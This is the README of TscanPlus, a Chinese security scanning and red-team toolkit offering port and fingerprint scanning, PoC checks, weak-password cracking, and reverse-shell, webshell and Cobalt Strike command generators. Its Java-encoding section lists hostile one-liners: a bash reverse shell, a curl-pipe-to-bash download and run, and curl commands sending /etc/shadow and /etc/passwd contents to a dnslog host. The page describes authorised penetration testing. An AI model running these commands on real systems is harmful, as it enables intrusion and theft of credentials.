



<div align=center><img src=images/TscanPlus.png width=50% ></div>


## 无影(TscanPlus)

[TscanClient 介绍(命令行版) ][url-TscanClient] 

[English Introduction][url-docen] 

一款综合性网络安全检测和运维工具，旨在快速资产发现、识别、检测，构建基础资产信息库，协助甲方安全团队或者安全运维人员有效侦察和检索资产，发现存在的薄弱点和攻击面。

**【主要功能】** 端口探测、服务识别、URL指纹识别、POC验证、弱口令猜解、目录扫描、UrlFinder、域名探测、网络空探、项目管理等。

**【辅助功能】** 编码解码、加密解密、CS上线、反弹shell、杀软查询、提权辅助、常用命令、字典生成、JAVA编码、资产分拣、Hots碰撞、40xBypass、Jwt破解、Ip归属地查询等。

https://github.com/TideSec/TscanPlus/assets/46297163/0f8cff21-6c33-4da3-bb6d-5f33d032a23e

<video controls="controls" loop="loop" autoplay="autoplay"> 
    <source src="images/TscanPlus-Introduce.mp4" type="video/mp4">
</video>

在2019年就用Python写过指纹识别工具—— [TideFinger](https://github.com/TideSec/TideFinger) ，并实现了一个免费在线的指纹检测平台——潮汐指纹 [finger.tidesec.com](http://finger.tidesec.com) ， 目前已积累用户3万余人，每日指纹识别约2000余次，2023年初又基于Go语言开发了Go版的 [TideFinger_Go](https://github.com/TideSec/TideFinger_Go) ，在web指纹和服务指纹的识别方面积累了一些经验。后来我们团队内部大佬基于Fscan开发了一个Tscan，主要是用于内部的POC收集整理并形成自动化武器库，可基于指纹识别结果对poc进行精准检测。无影(TscanPlus)就是以指纹和Poc为根基，扩展了多项自动化功能，可大大提高安全运维和安全检测的效率，方便网络安全从业者使用。


**【特色功能】**

1、内置5.2W余条指纹数据，对1万个web系统进行指纹识别仅需8-10分钟，在效率和指纹覆盖面方面应该是目前较高的了。

2、在指纹探测结果中，对130多个红队常见CMS和框架、Poc可关联CMS进行了自动标注。内置大量高质量Poc，并可外接Nuclei、Afrog、Xray等Poc工具，可实现指纹和Poc的联动，根据指纹识别的结果自动关联Poc，并可直接查看poc数据包相关信息。

3、在创建IP端口扫描、Url扫描时，可关联Poc检测、密码破解、目录扫描等功能，发现匹配的服务或产品时会自动触发密码破解或poc检测。

4、内置34种常见服务的弱口令破解，可方便管理员对内网弱口令进行排查，为提高检测效率，优选并精简每个服务的用户名和密码字典。覆盖的服务包括：SSH,RDP,SMB,MYSQL,SQLServer,Oracle,MongoDB,Redis,PostgreSQL,MemCached,Elasticsearch,FTP,Telnet,WinRM,VNC,SVN,Tomcat,WebLogic,Jboss,Zookeeper,Socks5,SNMP,WMI,LDAP,LDAPS,SMTP,POP3,IMAP,SMTP_SSL,IMAP_SSL,POP3_SSL,RouterOS,WebBasicAuth,Webdav,CobaltStrike等。

5、实现了编码解码、哈希计算、加密解密、国密算法、数据格式化、其他转换等共36种类型，其中编码解码类8种、哈希计算13种、加密解密9种、国密算法3种、数据格式化9种、其他2种。包含了AES、RSA、SM2、SM4、DES、3DES、Xor、RC4、Rabbit、Base64、Base32、URL、ASCII、各进制转换、字符串与进制转换、HTML、Unicode、MD5、Hmac、SM3、SHA1、SHA2、SHA3、NTLM、JSON格式化与压缩、XML格式化与压缩、IP地址与整数互转、String.fromCharCode、Unix时间戳互转、文本去除重复行、字母大小写、生成各类随机字符串、字符串反转、JWT解析与弱密码、一键解密OA等。

6、目录枚举默认使用HEAD方式，可对并发、超时、过滤、字典等进行自定义，内置了DirSearch的字典，可导入自己的字典文件，也可用内置字典fuzz工具进行生成。

7、内置各类反弹shell命令85条、Win内网(凭证获取、权限维持、横向移动)命令26类、Linux内网命令18类、下载命令31条、MSF生成命令21条、CS免杀上线命令等，可根据shell类型、操作系统类型、监听类型自动生成代码。

8、灵活的代理设置，可一键设置全局代理，也可以各模块单独开启代理功能，支持HTTP(S)/SOCKS5两种代理，支持身份认证。

9、快速的子域名探测，域名可联动其他子功能，可配置key后对接多个网络空间探测平台，一键查询去重。

10、内置资产分拣、JsFinder、Host碰撞、Jwt秘钥破解、IP查询、Windows提权辅助、杀软查询、shiro解密等各类工具。

**【免责声明&使用许可】**

1、本工具禁止进行未授权商业用途，**禁止二次开发后进行未授权商业用途**。

2、本工具仅面向合法授权的企业安全建设行为，在使用本工具进行检测时，您应**确保该行为符合当地的法律法规**，并且已经**取得了足够的授权**。

3、如您在使用本工具的过程中存在任何**非法行为**，您需自行承担相应后果，我们将不承担任何法律及连带责任。

4、在安装并使用本工具前，请**务必审慎阅读、充分理解各条款内容，并接受本协议所有条款，否则，请不要使用本工具**。您的使用行为或者您以其他任何明示或者默示方式表示接受本协议的，即视为您已阅读并同意本协议的约束。


## 目录

* [更新日志](#更新日志)
* [软件使用](#软件使用)
    * [软件下载及更新](#1软件下载及更新)
    * [Welcome](#2Welcome)
    * [项目管理](#3项目管理)
    * [端口扫描](#4端口扫描)
    * [URL探测](#5URL探测)
    * [域名枚举](#6域名枚举)
    * [POC检测](#7POC检测)
    * [密码破解](#8密码破解)
    * [空间测绘](#9空间测绘)
    * [编码解码](#10编码解码)
    * [轻武器库](#11轻武器库)
        * 【目录枚举】
        * 【UrlFinder】
        * 【Host碰撞】
        * 【40xBypass】
        * 【Jwt解码及破解】
        * 【IP归属查询】
        * 【代理池功能】
    * [红队命令](#12红队命令)
        * 【红队命令】
        * 【下载命令】
        * 【Websehll】
        * 【java编码】
        * 【反弹shell】
        * 【CS上线】
    * [辅助工具](#13辅助工具)
        * 【资产分拣】
        * 【密码生成】
        * 【密码查询】
        * 【提权辅助】
        * 【杀软查询】
    * [其他功能](#14其他功能)
        * 【导出功能】
        * 【数据库管理】
        * 【配置管理】
        * 【主题设置】
        * 【日志功能】
* [软件下载](#软件下载)
* [致谢](#致谢)
* [FAQ](#FAQ)

### 更新日志

感谢各位师傅提出的宝贵修改建议和诸多bug！

v2.7.2 【2025.02.18】 增加MQTT端口破解功能、代理池增加根据关键词切换代理等

v2.7.1 【2025.01.23】 增加导出项目所有数据到Excel、代理池增加自动破解功能等

v2.7.0 【2025.01.18】 代理池可批量启用、禁用、删除等，显示当前代理IP及手工切换

v2.6.9 【2025.01.10】 Zoomeye接口API升级、资产分拣功能完善和优化、过滤打印机

v2.6.8 【2025.01.06】 部分web指纹优化完善、密码猜解线程优化、jwt字典自定义等

v2.6.7 【2024.12.25】 代理先验证后使用、前后台数据同步、Fofa不同权限查询

v2.6.6 【2024.12.22】 空间测绘功能增加查询语法聚合、url探测异常修复

v2.6.5 【2024.12.18】 增加代理池管理、中英文切换、多网卡选择等，修复增强多项功能

v2.6版 【2024.10.18】 增加程序自动更新、密码破解结果连接验证、内置poc增至2300+等

v2.5版 【2024.09.15】 重构端口扫描模块，效率提升2-3倍、Poc检测资源占用高等修复等

v2.4版 【2024.09.01】 防误报算法优化升级、新增webshell生成、密码破解漏报和闪退修复等

v2.3版 【2024.08.12】 升级框架、增加Log功能、资源占用优化、空间探测算法优化等

v2.2版 【2024.07.22】 增加1300+Poc、Key认证、Host碰撞、40xBypass检测、Jwt破解和加解密、IP归属查询等

v2.1版 【2024.07.01】 增加自定义被动指纹、程序中断恢复、自定义header信息、导出资产excel高危标红等

v2.0版 【2024.06.18】 增加编解码功能，支持36种编解码、加解密、哈希等，Nuclei自定义poc智能匹配

v1.9版 【2024.05.28】 增加指纹探测规则8327条，总计51873条，远程下载非核心配置文件，增加主动指纹探测

v1.8版 【2024.05.01】 密码破解功能完善及多线程优化、资产较多时的前端响应优化，项目漏洞详情展示

v1.7版 【2024.04.16】 增加资产分拣功能，Poc检测可直接调用Nuclei、Xray、Afrog，增加自定义poc功能

v1.6版 【2024.03.25】 增加项目管理流程，增强各功能模块联动，数据库可对所有功能和数据进行增删改查

v1.5版 【2024.03.01】 增加一键检测ApiKey可用性功能，AV识别数据库更新，支持自定义添加红队命令

v1.4版 【2024.02.18】 增加网络空间探测功能模块，内置9种常见空间探测API，增加目录枚举递归限制及过滤功能

v1.3版 【2024.01.22】 增加密码生成功能，内置三种生成模式，增加设备弱口令查询功能，内置1.1万条记录

v1.2版 【2024.01.10】 增加子域名枚举、接口查询功能，针对非web服务的指纹识别进行优化，增加导出excel功能

v1.1版 【2023.12.27】 新增加java命令编码，重构目录枚举实现方式，效率提高10倍，IP扫描和指纹识别同步进行 

v1.0版 【2023.12.21】 实现局部/全局代理功能，支持HTTP(s)/SOCKS5，正式版发布

v0.9版 【2023.12.19】 实现各功能之间的任务联动及右键菜单联动 

v0.8版 【2023.12.15】 增加版本更新检查、有效期校验、配置文件读写等 

v0.7版 【2023.12.12】 辅助功能杀软查询、提权辅助完成

v0.6版 【2023.12.10】 反弹shell、CS上线、下载命令、红队命令完成

v0.5版 【2023.12.08】 目录枚举及Fuzz模式实现 

v0.4版 【2023.11.29】 弱口令破解模块功能实现

v0.3版 【2023.11.18】 Poc检测及Poc指纹匹配功能实现

v0.2版 【2023.11.01】 Url扫描及web指纹精简功能实现

v0.1版 【2023.10.23】 Ip及端口扫描、服务识别功能实现

v0.0版 【2023.10.10】 TscanPlus架构选择及功能初步规划


### 软件使用

#### 1、软件下载及更新

Github下载：https://github.com/TideSec/TscanPlus/releases 

知识星球：【剑影安全实验室】见下方二维码（**更多、更新版本**）

软件基于Wails开发，可支持Windows/Mac/Linux等系统，下载即可使用。

由于MacOs的一些安全设置，可能会出现个别问题，如报错、闪退等情况，详见最下方FAQ。

Windows运行时依赖 [Microsoft WebView2](https://developer.microsoft.com/en-us/microsoft-edge/webview2/)，默认情况下，Windows11和win2012会安装它，但有些旧机器(如Win2k8)不会，如机器没有webview2环境，程序会引导下载安装webview2。另外Windows程序使用了Upx压缩，杀毒软件可能会报病毒，请自查。

#### 2、Welcome

软件运行后，需审慎阅读、充分理解 **《免责声明&使用许可》** 内容，并在Welcome页面勾选 **“我同意所有条款”** ，之后方可使用本软件。

<div align=center><img src=images/image-20240327171101515.png width=80% ></div>

**【Key认证功能】**

为了"无影(TscanPlus)"的Poc检测更全面、精准，能形成良性生态，新增key认证功能。

经过key认证后，可使用所有内置POC，未认证用户只能使用420个POC，其他功能均可正常使用。

<div align=center><img src=images/image-20240721003109091.png width=80% ></div>

通过key认证后，可使用所有内置的1300个poc。

<div align=center><img src=images/image-20240721012102311.png width=80% ></div>

**获取Key的三条途径:**

（1）在Poc平台提交3个Poc后可获得3个Key，之后每多提交一个Poc可多获得一个Key。

（2）在交流群或Github Issue中提交一个有效Bug，Bug修复后可获得一个Key。

（3）加入星球可直接获得3个Key，每隔三个月可重置一次key，之后每提交一个Poc可多获得一个Key。

**关于Key认证问题**

（1）只有初次进行Key校验的时候才需要联网(连接到poc.tidesec.com)认证，认证成功后不再需要再联网校验。

（2）每个Key只能使用一个客户端，目前主要结合网卡等硬件序列号进行匹配，所以当硬件更换时可能导致认证失败。

（3）Key认证只是为了能让poc使用和搜集形成良性循环，"取之于众，用之于众"，建议大家手头有poc的可以提交poc。

**详细Key提交、获取和使用说明可看这里：http://poc.tidesec.com/index/explain.html**

####  3、项目管理

项目管理功能是把各功能进行流程整合，用户可根据自己的使用场景设计项目功能，完美融合了"资产测绘"、"子域名枚举"、"IP端口扫描"、"密码破解"、"POC检测"、"URL扫描"、"目录探测"、"UrlFinder"等功能。项目执行结果会存储到相应项目数据库中，方便后续查询和使用。

**【任务配置】**

在添加目标资产并配置任务参数后，TscanPlus会在后台对相应目标执行相应操作，并显示在对应功能Tab栏中。

1、各任务为顺序执行，"资产测绘" => "子域名枚举" => "IP端口扫描" => "密码破解" => "POC检测" => "URL扫描" => "目录探测" => "UrlFinder"，默认情况下，上一步探测发现的资产会作为后一阶段的资产输入。

2、在使用资产测绘功能时，如果测绘发现的资产可能不属于你的目标范围时，开启“对资产测绘结果进行扫描和POC检测”时，空间测绘的资产可能超授权范围，请慎用。

3、开启URL探测功能后，会对域名+IP+URL+空间测绘等发现的所有web应用进行URL指纹探测。

4、不选择“POC匹配指纹”时，会对所有探测到的资产+所有POC进行测试。

5、开启“所有端口和服务”后，会对匹配到的所有端口和服务进行破解，不开启时只破解常见的8种服务。

6、在使用目录探测功能时，如选择"仅URL列表"时，仅会对URL列表中的URL进行目录探测。选择"所有结果URL"时，会对IP探测、域名任务等发现的所有URL进行目录探测，当URL较多时可能会较慢。

<div align=center><img src=images/image-20240327161224753.png width=80% ></div>

**【项目管理】**

在项目管理中，还可直观的展示项目概览，如项目总数、URL资产、IP资产、漏洞总数、敏感信息等，并可对所有项目进行编辑、重新执行、停止、删除等操作。

<div align=center><img src=images/image-20240617182736349.png width=80% ></div>

**【结果展示】**

所有扫描结果将显示在对应功能Tab中。

<div align=center><img src=images/image-20240327160956342.png width=80% ></div>

#### 4、端口扫描

对目标IP进行存活探测、端口开放探测、端口服务识别、Banner识别等，可识别100余种服务和协议。

**【任务配置】**

IP支持换行分割，支持如下格式：192.168.1.1、192.168.1.1/24、192.168.1.1-255、192.168.1.1,192.168.1.3

排除IP可在可支持输入的IP格式前加!： !192.168.1.1/26

可选择端口策略、是否启用Ping扫描、是否同步密码破解、是否同步POC检测、是否开启代理，配置任务后可开启扫描。

**【扫描结果】**

扫描结果如下，会显示服务相关协议、Banner、状态码、标题等，如Banner中匹配到可能存在漏洞的产品会使用红色标识。

选择某一行，右键菜单也可对某地址进行单独POC测试、弱口令测试、目录枚举等，也可以对数据进行单条保存或全部保存。

<div align=center><img src=images/image-20231221132923278.png width=80% ></div>

为方便某些场景下的使用，针对内网开放445端口的服务器会自动进行MS17010原理性探测，在避免对服务器造成影响的同时尽可能的探测可能存在的漏洞。

<div align=center><img src=images/image-20240617181901258.png width=80% ></div>

**【功能联动】**

在任意功能中，都可与其他功能进行联动，比如IP扫描时可同时开启密码破解和POC检测，一旦发现匹配的端口服务会自动进行密码破解，发现匹配的指纹时会进行poc检测。勾选这两项即可，结果会显示在相关模块中。

<div align=center><img src=images/image-20231221144525144.png width=80% ></div>


https://github.com/TideSec/TscanPlus/assets/46297163/2a88ced9-1612-4015-aa5e-0bb0e243525a

<video controls="controls" loop="loop" autoplay="autoplay"> 
    <source src="images/TscanPlus.mp4" type="video/mp4">
</video>


**【高级配置】**

在高级配置中可设置代理地址，在开启全局代理后，各功能都会代理，支持HTTP(S)/SOCKS5两种代理，支持身份认证。还可以设置全局cookie或UA等。

代理格式：

HTTP代理格式：http://10.10.10.10:8081  或 http://user:pass@10.10.10.10:8081  

HTTPS代理格式：https://10.10.10.10:8081  或 https://user:pass@10.10.10.10:8081  

Socks5代理格式：socks5://10.10.10.10:8081  或 socks5://user:pass@10.10.10.10:8081  

<div align=center><img src=images/image-20231221133246236.png width=80% ></div>

#### 5、URL探测

TscanPlus目前整合指纹2.6W余条，经多次优化，有效提高了资产发现的协程并发效率，对1万个web系统进行指纹识别仅需8-10分钟，在效率和指纹覆盖面方面应该是目前较高的了。

**【任务配置】**

URL探测主要针对web地址进行批量检测，输入格式为Url地址每行一个，并且前缀为http/https：
http://www.abc.com
http://192.168.1.1:8080
https://www.abc.com:8443

同样，可选择线程数、是否同步POC检测、是否开启代理，配置任务后可开启扫描。

**【自定义指纹】**

TscanPlus自v2.1版本后，支持自定义指纹，包括被动指纹和主动指纹。

开启主动指纹探测后，在配置文件目录中，编辑`FingerDir.yaml`文件，即可添加主动探测指纹规则。每增加一条主动指纹，那么在指纹识别时，就会多发出一条http请求，量较大时会比较影响指纹识别效率，所以慎重添加。

<div align=center><img src=images/image-20240701110500509.png width=80% ></div>

在配置文件目录下，存在`Finger.json`文件，这是被动指纹识别的规则库，指纹库采用Wappalyzer格式，为方便实用自定义指纹，增加了headerstr和titlestr两个键，可分别进行header、title字符串的匹配。如自定义指纹和内置指纹重复，会优先使用自定义指纹。在添加自定义指纹后，先测试再使用！

<div align=center><img src=images/image-20240701110842309.png width=80% ></div>

**【扫描结果】**

扫描结果如下，会显示web站点标题、Banner、状态码、中间件、WAF识别等，如Banner中匹配到可能存在漏洞的产品会使用红色标识。

选择某一行，右键菜单也可对某地址进行单独POC测试、目录枚举等，也可以对数据进行单条保存或全部保存。

<div align=center><img src=images/image-20231221133907830.png width=80% ></div>

#### 6、域名枚举

在域名枚举方面TscanPlus集成了多种功能，可以使用字典枚举，也可以使用多个免费接口进行查询。

**【任务配置】**

枚举较依赖网络，所以多域名时会逐个进行。默认10000的字典，线程50在网络状态较好时大约用时12秒。

域名每行一个，不要加http前缀，如:

tidesec.com
tidesec.com.cn

同样，可选择线程数（建议50-00）、是否同步POC检测、是否指纹识别，配置任务后可开启域名任务。

**【扫描结果】**

扫描结果如下，会显示子域名、解析IP、开放端口、网站标题、域名来源等，如Banner中匹配到可能存在漏洞的产品会使用红色标识。

选择某一行或多行，右键菜单也可对某地址进行单独POC测试、目录枚举等，也可以对数据进行单条保存或全部保存。

<div align=center><img src=images/image-20240110164454188.png width=80% ></div>

#### 7、POC检测

TscanPlus内置了部分POC，并进行了Level分类，Level1是最常见、使用频率最高的POC，Level2是较通用的POC，Level3为不太常见POC。

**【任务配置】**

URL可导入txt文件，也可自行输入，必须是HTTP/HTTPS为前缀的URL地址。

比较重要的一个选项是“POC匹配指纹”，默认开启这个选项，这时会根据指纹信息匹配POC，如匹配不到POC则不检测。关闭该选项后，会对所有选择的POC进行测试。

POC选项可指定外部POC文件或POC文件夹，在后面输入POC的绝对路径，如C:\POC，但导入的POC无法和指纹进行匹配，默认会把导入的POC全跑一遍。

外部POC可支持Xray或Xray或同样格式的POC，POC编写可参考：https://poc.xray.cool/ 或 https://phith0n.github.io/xray-poc-generation/

**【自定义poc】**

Poc检测可直接调用Nuclei、Xray、Afrog等外部POC工具，并可对各工具的poc进行自定义。

在开启“Poc匹配指纹”功能后，程序会根据目标指纹对外置poc进行模糊匹配，之后再进行poc检测，可大大减少poc检测发包量，缩减检测时间。

<div align=center><img src=images/image-20240417162352536.png width=80% ></div>

Nuclei的poc会默认下载到用户文件夹下的nuclei-templates目录，本程序会自动识别该目录，所以想在Nuclei中使用“Poc匹配指纹”功能时可不指定Nuclei的Poc。

但Afrog的Poc默认是内置在程序中，所以如果想在Afrog中使用“Poc匹配指纹”功能，需从https://github.com/zan8in/afrog/tree/main/pocs/afrog-pocs 中下载poc文件，然后在程序中指定Poc所在目录，即可在Afrog中使用“Poc匹配指纹”功能。

对指纹匹配Poc的规则进行了优化和完善，在防止漏报的情况下，尽可能的减小poc检测数量。添加poc检测级别过滤器，可有效避免nuclei、afrog工具默认扫描时的大量info类信息。

<div align=center><img src=images/image-20240617182603002.png width=80% ></div>



无影(TscanPlus)的自定义POC功能也已经完善，可兼容Xray Poc 1.0版和Fscan的Poc格式。
自行编写Poc时，可使用工具进行测试编写：https://github.com/phith0n/xray-poc-generation 

**【扫描结果】**

扫描结果如下，会显示发现漏洞的站点、POC名称、Banner、状态码、标题等，选择某一行后，可查看Request和Response数据包。

最下方会显示目标存活数量、检测成功POC数量、检测队列情况、用时等。

<div align=center><img src=images/image-20231221135024558.png width=80% ></div>

#### 8、密码破解

TscanPlus内置34种常见服务的弱口令破解，可方便管理员对内网弱口令进行排查，为提高检测效率，优选并精简每个服务的用户名和密码字典。覆盖的服务包括：SSH,RDP,SMB,MYSQL,SQLServer,Oracle,MongoDB,Redis,PostgreSQL,MemCached,Elasticsearch,FTP,Telnet,WinRM,VNC,SVN,Tomcat,WebLogic,Jboss,Zookeeper,Socks5,SNMP,WMI,LDAP,LDAPS,SMTP,POP3,IMAP,SMTP_SSL,IMAP_SSL,POP3_SSL,RouterOS,WebBasicAuth,Webdav,CobaltStrike等。

**【任务配置】**

在左侧选定要破解的服务，并填入目标地址即可。右侧配置任务时，可选择使用内置字典或自行导入、是否开启指纹识别、Oracle监听设置、执行命令等。

<div align=center><img src=images/image-20240417162518632.png width=80% ></div>



**【扫描结果】**

扫描结果如下，会显示发现弱口令的服务、账号、密码、Banner、执行命令、用时等。

最下方会显示目标存活数量、破解成功数量、检测队列情况、用时等，并会实时显示破解日志。

<div align=center><img src=images/image-20231221140432486.png width=80% ></div>

在TscanPlus v2.6之后版本中，新增密码破解结果连接验证功能，可对破解发现的弱口令进行连接校验，支持十多种常见协议。

<div align=center><img src=images/mysql.png width=80% ></div>

<div align=center><img src=images/ssh.png width=80% ></div>



#### 9、空间测绘

为使信息搜集更快捷方便，TscanPlus集成了多个网络空间测绘接口，包括鹰图**Hunter、Fofa、shodan、360 Quake、Zoomeye 钟馗之眼、Censys、微步在线ThreatBook、BinaryEdge、VirusTotal**等9个主流空探API，可根据域名、IP地址、端口、应用、服务等进行检索，并对各网络空探结果进行去重整合。

**【任务配置】**

首先要配置key信息，如没有key可点击后面"API申请"进行申请，之后点击启用即可使用该API接口。

在主界面选择字段，如域名、IP地址、端口、应用、服务、body、证书、ICON等进行检索，并输入检索条件即可。TscanPlus会对所有结果进行去重和整合。

针对Fofa API增加自定义API地址功能，在设置Fofa ApiKey时，如需要使用自定义API地址功能，格式只要按照`邮箱:key||url`，在url和key之间为双竖线即可，示例如下：`9*****@qq.com:3f21a408*********6e3fa8078||http://fofaapi.com`,添加完成后可进行key可用性验证，测试是否能获取数据。

<div align=center><img src=images/image-20240327165140791.png width=80% ></div>



**【查询结果】**

查询结果如下，会显示URL、IP、域名、端口、协议、标题、指纹、应用、Whois、备案、ISP、OS、地区、更新时间、API来源等信息。

选择某一行或多行，右键菜单也可对某地址进行单独POC测试、目录枚举、端口扫描等，也可以对数据进行单条保存或全部保存。

<div align=center><img src=images/image-20240327164931978.png width=80% ></div>

支持自定义语法，但由于每种测绘引擎都有不同语法，自定义语法一般无法通用。

<div align=center><img src=images/image-20241018143704418.png width=80% ></div>

#### 10、编码解码

编解码功能模块实现了编码解码、哈希计算、加密解密、国密算法、数据格式化、其他转换等共36种类型，其中编码解码类8种、哈希计算13种、加密解密9种、国密算法3种、数据格式化9种、其他2种。

**【任务配置】**

1、只需在"编码解码"功能页面的左侧栏目中点选对应的编码项，即可添加到右侧Tab中。

2、每个Tab支持多个编码叠加，并支持编码的排序，上一个编码的输出会作为下一个编码的输入。

3、每种编码都可以选择是否启用、加密或解密，对每个编码可进行输入和输出格式进行设置，支持RAW、Hex、base64等常见格式。

4、无影支持多Tab切换，可以根据需求设置多组Tab，以对结果进行对比。

5、可记住本次编码配置，下次再运行软件，可直接使用上一次的配置。

<div align=center><img src=images/image-20240617175854995.png width=80% ></div>

**【输出结果】**

**1、编码解码**：Base64、Base32、URL编解码、ASCII、各进制转换、字符串与进制转换、HTML编解码、Unicode编解码、一键编解码等

<div align=center><img src=images/image-20240617180132022.png width=80% ></div>

一键编解码可实现对输入的字符，进行所有的编码解码并输出结果。

<div align=center><img src=images/image-20240617180214330.png width=80% ></div>

**2、哈希计算**：MD5、HmacMD5、SM3、HmacSM3、SHA1、HmacSHA1、SHA2-224、SHA2-256、SHA2-384、SHA2-512、HmacSHA2、SHA3-224、SHA3-256、SHA3-384、SHA3-512、HmacSHA3、NTLM、HmacNTLM、一键哈希等。

<div align=center><img src=images/image-20240617180257634.png width=80% ></div>

一键哈希可实现对输入的字符，进行所有的哈希计算并输出结果。

<div align=center><img src=images/image-20240617180402999.png width=80% ></div>

**3、加密解密**：AES加解密、RSA加解密、SM2加解密、SM4加解密、DES加解密、3DES加解密、Xor加解密、RC4加解密、Rabbit加解密、自动生成RSA秘钥、自动生成SM2秘钥等

<div align=center><img src=images/image-20240617180635476.png width=80% ></div>

<div align=center><img src=images/image-20240617180748714.png width=80% ></div>

**4、国密算法**：SM2椭圆曲线非对称加密算法、SM4分组对称密码算法、SM3密码杂凑算法、并支持自动生成SM2秘钥。

<div align=center><img src=images/image-20240617180836752.png width=80% ></div>

**5、数据格式化**：JSON格式化与压缩、XML格式化与压缩、IP地址与整数互转、String.fromCharCode、Unix时间戳互转、文本去除重复行、字母大小写、生成各类随机字符串、字符串反转

<div align=center><img src=images/image-20240617181019264.png width=80% ></div>

<div align=center><img src=images/image-20240617181053649.png width=80% ></div>

**6、其他**：JWT解析与弱密码、一键解密所有OA

<div align=center><img src=images/image-20240617181132609.png width=80% ></div>

#### 11、轻武器库

##### 【目录枚举】

目录枚举主要是对web站点进行目录枚举，支持字典模式、Fuzz模式、存活探测等，支持HEAD/GET方法，默认使用HEAD方法。

**【任务配置】**

字典默认使用dirsearch内置字典，大约9000条数据，扩展支持asp、aspx、jsp、php、py等格式，TideFuzz开启后会根据枚举结果进行递归Fuzz。

如果使用Fuzz模式，需输入fuzz元字符，之后会根据fuzz长度生成字典，但注意fuzz字典不能过大，当字典超过10万行时会提示字典过大，无法扫描。

还可以配置超时时间、超时重试次数、间隔时间、URL并发数、目录线程数等，并可以对扩展名、状态码进行过滤。

**【扫描结果】**

扫描结果如下，会显示发现的URL地址、状态码、Body长度等，选择某一行后，可查看Request和Response数据包。

最下方会显示目标存活数量、枚举成功数量、检测队列情况、用时等。

<div align=center><img src=images/image-20240219111318207.png width=80% ></div>

##### 【UrlFinder】

URLFinder功能可对目标信息进行快速、全面的提取，可用于分析页面中的js与url，查找隐藏在其中的敏感信息或未授权api接口。

**【任务配置】**

输入目标地址后，可进行模式选择，"普通模式"默认对单层链接进行抓取，"深入模式"会对链接进行三层抓取，耗时相对长一些。

探测层数可设置探测的链接层数，上限数量是对URL总数进行限制，防止无限制爬取。

"仅显示本站"是对URL和JS结果进行过滤，此外还可以配置线程数，并可以对扩展名、状态码、关键词进行过滤。

**【扫描结果】**

扫描结果如下，会显示发现的URL地址、状态码、Body长度等，当发现敏感信息时，会在"标题||敏感信息"列中显示。

最下方会显示目标存活数量、枚举成功数量、检测队列情况、用时等。

1、对返回同样长度、同样状态码的页面，出现5次以上不再显示

2、增加关键字过滤、返回长度过滤、自定义后缀等功能。

<div align=center><img src=images/image-20240327163203001.png width=80% ></div>



##### 【Host碰撞】

Host碰撞通过修改Host字段来发送数据包，该功能可对 IP和域名碰撞匹配，访问到绑定host才能访问的系统。因为现在越来越多的业 务是通过nginx等负载进行反向代理访问，可能有些内网域名和外网域名使用相同的 负载均衡进行反代，这样就可能通过修改host字段实现访问内网系统。

<div align=center><img src=images/image-20240721003650858.png width=80% ></div>

##### 【40xBypass】

做渗透测试时常会碰到40x的资产，而有一些40x的页面是可以绕过的，比如不同的HTTP方法、Referer绕过、代理IP、HTTP Header修改、替换大小写等。40xBypass检测功能集成了8种常见bypass方式，并可在config/4xxBypass目录下修改字典文件。

<div align=center><img src=images/image-20240721005116585.png width=80% ></div>

##### 【Jwt解码及破解】

可对jwt进行加解码和秘钥破解，支持HS256、HS384、HS512、RS256、RS384、RS512、ES256、EDDSA等多种算法。内置秘钥字典10W+，两秒可完成，

<div align=center><img src=images/image-20240721010740227.png width=80% ></div>

##### 【IP归属查询】

针对ip地址、子域名等资产可自动提取，并查询物理地址。并在ip扫描、url探测、子域名枚举时，增加ip查询功能。

<div align=center><img src=images/image-20240721010957230.png width=80% ></div>

<div align=center><img src=images/image-20240721011103618.png width=80% ></div>



##### 【代理池功能】

代理池目前主要包括：添加代理、自动爬取代理、代理场景切换、代理验证、代理Listener管理等功能。

在开启代理Listener后，可配合不同代理切换模式，轮训、遍历代理池中的所有可用代理，提供代理给无影或其他外部应用进行使用。

详细用法介绍可参考：[【无影代理池管理功能介绍】](https://github.com/TideSec/TscanPlus/blob/main/%E6%97%A0%E5%BD%B1%E4%BB%A3%E7%90%86%E6%B1%A0%E7%AE%A1%E7%90%86%E5%8A%9F%E8%83%BD%E4%BB%8B%E7%BB%8D.md)

<div align=center><img src=images/image-20241225095955306.png width=80% ></div>

#### 

#### 12、红队命令

TscanPlus内置常用红队命令，包括Win内网(凭证获取、权限维持、横向移动)命令26类、Linux内网命令18类、下载命令31条。内置各类反弹shell命令85条、MSF生成命令21条、CS免杀上线命令等，可根据shell类型、操作系统类型、监听类型自动生成代码。

##### **【红队命令】**

Win内网(凭证获取、权限维持、横向移动)命令26类、Linux内网命令18类。

<div align=center><img src=images/image-20231221142158055.png width=80% ></div>

##### **【下载命令】**

内置常见下载命令31条，基本能覆盖内网渗透能用到的下载方法。

配置URL地址和目标文件名后，可自动生成相应代码。

<div align=center><img src=images/image-20231221142332714.png width=80% ></div>

##### **【Webshell】**

内置各种语言的基本一句话webshell和部分免杀马，以及冰蝎、蚁剑、哥斯拉等常见webshell的免杀马，共安全人员参考。

<div align=center><img src=images/image-20240830151318754.png width=80% ></div>

#####  **【java编码】**

有时，通过 `Runtime.getRuntime().exec()` 执行命令有效负载会导致失败。使用 WebShell，反序列化利用或通过其他媒介时，可能会发生这种情况。

有时这是因为重定向和管道字符的使用方式在正在启动的进程的上下文中没有意义。例如，`ls > dir_listing`在shell中执行应该将当前目录的列表输出到名为的文件中`dir_listing`。但是在`exec()`函数的上下文中，该命令将被解释为获取`>`和`dir_listing`目录的列表。

其他时候，其中包含空格的参数会被StringTokenizer类破坏，该类将空格分割为命令字符串。那样的东西`ls "My Directory"`会被解释为`ls '"My' 'Directory"'`。

在Base64编码的帮助下，java命令编码转换器可以帮助减少这些问题。它可以通过调用Bash或PowerShell再次使管道和重定向更好，并且还确保参数中没有空格。

常用命令清单

```
bash -i >& /dev/tcp/127.0.0.1/6666 0>&1
ping `whoami`.key.dnslog.cn
curl http://www.google.com/bash.txt|bash
curl http://key.dnslog.cn/?r=`whoami`
curl http://key.dnslog.cn/?r=`cat /etc/shadow|base64`
curl http://key.dnslog.cn/?r=$(cat /etc/passwd|base64|tr '\n' '-')
curl http://www.google.com/key.txt
curl http://www.google.com/key.txt -O
curl http://www.google.com/key.txt -o key.txt
```

<div align=center><img src=images/image-20240111143548211.png width=80% ></div>

##### **【反弹shell】**

可设置IP/PORT、listener类型、shell类型、是否编码，选择你想要的命令后，即可生成响应代码。

<div align=center><img src=images/image-20231221141826648.png width=80% ></div>

##### **【CS上线】**

CS上线配置CS Payload地址后，即可生成相应代码。

<div align=center><img src=images/image-20231221141838825.png width=80% ></div>

#### 13、辅助工具

